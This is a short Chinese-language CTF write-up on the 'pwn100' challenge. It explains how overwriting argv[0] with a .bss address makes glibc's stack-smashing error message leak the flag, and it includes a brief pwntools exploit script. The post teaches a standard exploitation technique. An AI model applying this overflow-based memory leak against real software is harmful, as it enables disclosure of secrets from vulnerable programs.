---
title: pwn100 ssp 
date: 2017-04-08 19:34:10
tags:
- ssp
- pwn
- ctf
---
ssp–利用栈溢出保护来泄露内存这payload贼短。。题目链接：sspStack-smashing Protection (SSP，又名 ProPolice），是在函数的栈底插入一个随机数，这个随机数在函数调用结束后会被检测，如果与预设的不同，就会直接退出程序并打印如下的错误提示:    *** stack smashing detected ***: ./pwn100 terminated
<!-- more -->
## ssp–利用栈溢出保护来泄露内存
### 这payload贼短。。
Stack-smashing Protection (SSP，又名 ProPolice），是在函数的栈底插入一个随机数，这个随机数在函数调用结束后会被检测，如果与预设的不同，就会直接退出程序并打印如下的错误提示:
~~~
    *** stack smashing detected ***: ./pwn100 terminated
    Aborted (core dumped)
~~~

其中，./pwn100 是main函数的第一个参数，而这个值在这一题中是可以被覆盖的，而正好这题的flag是被读入了内存，存在一个全局变量里，所以我们可以把main函数的第一个参数覆盖为存有flag的全局变量在.bss段的地址，在打印错误信息时泄露出来：
~~~
    from pwn import *
    bss = 0x0600DC0
    io = process("./pwn100")

    payload = ""
    payload += p64(bss) * 0x40
    io.send(payload)

    io.interactive()
~~~

可以动态调试这个payload，跟进报错的函数 
~~~
___stack_chk_fail
~~~

来看参数如何传递并打印，据说CSAPP这本书的第8章有讲main函数参数在栈上的布局，我去看看，以后补发。
